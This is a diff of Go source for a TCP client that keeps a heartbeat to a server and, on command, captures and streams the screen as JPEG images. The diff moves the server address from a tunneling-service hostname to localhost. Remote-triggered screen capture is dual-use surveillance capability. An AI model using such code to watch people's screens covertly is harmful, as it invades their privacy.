@@ -24,7 +24,7 @@ const (
 )
 
 var isturn = true
-
+var stopScreen bool
 var wg sync.WaitGroup
 
 func Ma() {
@@ -33,19 +33,16 @@ func Ma() {
 
 }
 
-func heartbeat(conn net.Conn, interval time.Duration) {
+func heartbeat(conn net.Conn) {
 	for {
-		fmt.Println("连接了==========")
-		time.Sleep(interval)
-		writer := bufio.NewWriter(conn)
-		//创建心跳
-		_, err := fmt.Fprintln(writer, -1)
+		err := util.SendHead(byte(util.HEART), conn)
 		if err != nil {
-			fmt.Println(err)
-			//重连
+			fmt.Println("心跳丢失===》连接断开")
 			connectNew()
 			return
 		}
+		fmt.Println("连接了==========")
+		time.Sleep(time.Second * 10)
 	}
 	wg.Done() // 协程计数器加-1
 }
@@ -53,13 +50,14 @@ func heartbeat(conn net.Conn, interval time.Duration) {
 func connectNew() {
 
 	wg.Add(2) // 协程计数器 +1
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "qq80378994.e2.luyouxia.net:28602")
-	fmt.Println(inetSocketAddress)
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1011")
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
 		fmt.Println(err)
+		connectNew()
+		return
 	}
-	//defer socket.Close()
+	defer socket.Close()
 	// IO流
 	dataOutputStream := bufio.NewWriter(socket)
 
@@ -79,7 +77,7 @@ func connectNew() {
 	dataOutputStream.Flush()
 	// 协程计数器加-1
 	go doSomeThing(socket)
-	go heartbeat(socket, time.Second)
+	go heartbeat(socket)
 
 	wg.Wait() //等待协程计数器为0 退出
 	fmt.Println("abc========================")
@@ -91,7 +89,7 @@ func createScreen(socket net.Conn) {
 
 	util.SendHead(1, socket)
 	for {
-		//time.Sleep(time.Millisecond * 300)
+		time.Sleep(time.Second * 1)
 
 		screen, err := CaptureScreenAsJPEG(80)
 		if err != nil {
@@ -99,8 +97,14 @@ func createScreen(socket net.Conn) {
 		}
 		////compress := util.Compress(screen)
 
-		util.Send(2, screen, socket)
+		err = util.Send(2, screen, socket)
+		if err != nil {
+			return
+		}
 		fmt.Println("发送成功")
+		if stopScreen {
+			break
+		}
 	}
 }
 
@@ -133,17 +137,22 @@ func doSomeThing(socket net.Conn) {
 	for {
 		time.Sleep(time.Millisecond)
 		reader := bufio.NewReader(socket)
-		receiveHead := util.ReceiveHead(reader)
-
+		receiveHead, err := util.ReceiveHead(reader)
+		if err != nil {
+			return
+		}
 		fmt.Println(receiveHead)
 		switch string(receiveHead) {
 		//心跳
-		case string(0):
+		case string(99):
 			fmt.Println("heart...")
 
 		//屏幕监控
 		case string(1):
+			stopScreen = false
 			go createScreen(socket)
+		case string(3):
+			stopScreen = true
 		}
 	}
 	wg.Done() // 协程计数器加-1
